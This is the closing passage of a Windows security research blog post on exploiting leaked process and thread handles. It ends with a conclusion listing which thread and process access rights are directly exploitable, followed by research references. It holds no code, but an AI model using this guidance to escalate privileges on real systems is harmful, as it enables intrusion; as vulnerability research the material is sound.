<code>ThreadSelectedCpuSets</code>, and <code>ThreadNameInformation</code>. None of these get us
anywhere near an exploitable primitive.</p>
<h3 id="thread_set_thread_token">THREAD_SET_THREAD_TOKEN</h3>
<p>Similar to <code>THREAD_IMPERSONATE</code>, I was unable to find a direct and generic
method of abusing this right. I can set the thread&rsquo;s token or modify a few
fields (via <code>SetTokenInformation</code>), but this doesn&rsquo;t grant us much.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I was a little disappointed in how uneventful thread rights seemed to be.
Almost half of them proved to be unexploitable on their own, and even in
combination did not turn much up. As per above, having one of the following
three privileges is necessary to turn a leaked thread handle into something
exploitable:</p>
<pre tabindex="0"><code>THREAD_ALL_ACCESS
THREAD_DIRECT_IMPERSONATION
THREAD_SET_CONTEXT
</code></pre><p>Missing these will require a deeper understanding of your target and some
creativity.</p>
<p>Similarly, processes have a specific subset of rights that are directly
exploitable:</p>
<pre tabindex="0"><code>PROCESS_ALL_ACCESS
PROCESS_CREATE_PROCESS
PROCESS_CREATE_THREAD
PROCESS_DUP_HANDLE
PROCESS_VM_WRITE
</code></pre><p>Barring these, more creativity is required.</p>
<h2 id="references">References</h2>
<p>[0]https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html<br>
[1]https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html<br>
[2]https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/<br>
[3]https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights<br>
[4]https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext<br>
[5]https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext<br>
[6]http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/<br>
[7]https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html<br>
[8]https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html<br>
[9]https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51<br>
[10]https://github.com/SafeBreach-Labs/pinjectra<br>
[11]https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079<br>
[12]http://www.hexacorn.com/blog/category/code-injection/<br>
[13]http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage<br>
[14]http://www.nynaeve.net/?p=180<br>
[15]https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98</p>

			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
				
				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
				
				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
				
				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
				
				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
	</p>
</footer>

</body>
</html>
